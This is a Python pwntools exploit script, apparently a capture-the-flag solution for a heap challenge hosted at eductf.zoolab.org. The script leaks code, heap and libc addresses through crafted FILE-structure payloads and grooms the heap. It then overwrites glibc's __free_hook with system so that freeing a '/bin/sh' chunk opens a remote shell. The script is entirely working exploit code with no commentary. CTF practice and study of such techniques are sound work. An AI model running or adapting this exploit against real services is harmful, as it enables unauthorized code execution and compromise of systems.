#!/usr/bin/env python3

import os
import pwn

pwn.context.arch = 'amd64'
libc = pwn.ELF('./libc.so.6')

remote = pwn.remote('eductf.zoolab.org', 20005)
#remote = pwn.remote('10.88.6.201', 12346)

def new(idx, size, content):
  remote.sendlineafter('>> ', '1')
  remote.sendlineafter('IDX : ', str(idx))
  remote.sendlineafter('SIZE : ', str(size))
  #remote.sendlineafter('CONTENT: ', content)
  remote.sendline(content)

def show(idx):
  remote.sendlineafter('>> ', '2')
  remote.sendlineafter('IDX : ', str(idx))
  result = remote.recvuntil('\n', drop=True)
  return result

def remove(idx):
  remote.sendlineafter('>> ', '3')
  remote.sendlineafter('IDX : ', str(idx))

def take_flag():
  remote.sendlineafter('>> ', '4')


code_base = pwn.u64(show(249).ljust(8, b'\x00')) - 0x202008
print('code:', hex(code_base))

take_flag()

'''
lock_addr = 0
payload = b'A' * 0x188 + pwn.p64(lock_addr)
payload = payload.ljust(0x228, b'A')
payload = b''.ljust(0x228, b'A')
'''
#payload = pwn.p64(0xfbad2887 | 0xa00 | 0x1000)
payload = pwn.p64(0xfbad2887)
payload += pwn.p64(code_base + 0x202000) * 3
payload += pwn.p64(code_base + 0x202000) + pwn.p64(code_base + 0x202100) + pwn.p64(code_base + 0x202100)
payload += pwn.p64(code_base + 0x202000) * 5 + pwn.p64(0)
payload = payload.ljust(0x70, b'A') + pwn.p64(1)
new(-4, 0x230 - 0x8, payload)

remote.recvuntil(b'\x00' * 0x12)
heap_base = pwn.u64(remote.recv(8)) - 0x260
remote.recvuntil(b'\x00' * 0x8)
libc_base = pwn.u64(remote.recv(8)) - 0x3eba00
print('heap:', hex(heap_base))
print('libc:', hex(libc_base))

'''
vtable = b'A' * 0x100
vtable_addr = heap_base + 0x24a0
new(0, 0x200, vtable)

lock_addr = code_base + 0x202500
payload = payload.ljust(0x88, b'\x00') + pwn.p64(lock_addr)
payload = payload.ljust(0xd8, b'\x00') + pwn.p64(vtable_addr)
take_flag()

input()
new(-4, 0x230 - 0x8, payload)
'''

current_top = heap_base + 0x2490
need_size = (0x5000 - current_top) % 0x10000
while need_size > 0:
  this_size = min(need_size, 0x7000)
  new(100, this_size - 0x8, 'a')
  need_size -= this_size
# Now, top chunk is at 0x----5000

new(0, 0x18, 'a')
fake_heap = b'a' * 0x2d8 + pwn.p64(0x21) + b'a' * 0x18 + pwn.p64(0x21)
new(1, 0x1000 - 0x8, fake_heap)

take_flag()
payload = pwn.p64(0xfbad2885)
payload += pwn.p64(code_base + 0x202041) * 3
payload += pwn.p64(code_base + 0x202041) * 3
payload += pwn.p64(code_base + 0x202041) + pwn.p64(code_base + 0x202042) + pwn.p64(code_base + 0x202041) * 3 + pwn.p64(0)
payload = payload.ljust(0x70, b'A') + pwn.p64(1)
new(-4, 0x230 - 0x8, payload)

take_flag()
payload = pwn.p64(0xfbad2887)
payload += pwn.p64(code_base + 0x202000) * 3
payload += pwn.p64(code_base + 0x202000) * 3
payload += pwn.p64(code_base + 0x202000) * 5 + pwn.p64(0)
payload = payload.ljust(0x70, b'A') + pwn.p64(1)
new(-4, 0x230 - 0x8, payload)
## Target byte became 0x53 ('S')

remove(0)
remove(1)

freehook = libc_base + libc.symbols[b'__free_hook']
system = libc_base + libc.symbols[b'system']
fake_heap = b'a' * 0x2d8 + pwn.p64(0x21) + pwn.p64(freehook) + b'a' * 0x10 + pwn.p64(0x21)
new(1, 0x1000 - 0x8, fake_heap)
new(0, 0x18, 'a')
new(0, 0x18, pwn.p64(system))
new(0, 0x28, '/bin/sh')
remove(0)

remote.interactive()
